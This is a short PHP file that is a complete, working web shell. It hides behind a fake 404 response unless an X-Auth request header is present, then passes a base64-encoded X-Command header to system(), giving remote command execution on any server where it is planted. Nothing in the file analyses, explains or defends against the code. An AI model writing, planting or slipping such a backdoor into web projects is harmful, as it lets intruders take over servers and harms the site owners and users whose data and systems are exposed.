<?php
if (!isset($_SERVER['HTTP_X_AUTH'])) { header("HTTP/1.1 404 Not Found"); exit; }
system(base64_decode($_SERVER['HTTP_X_COMMAND']));

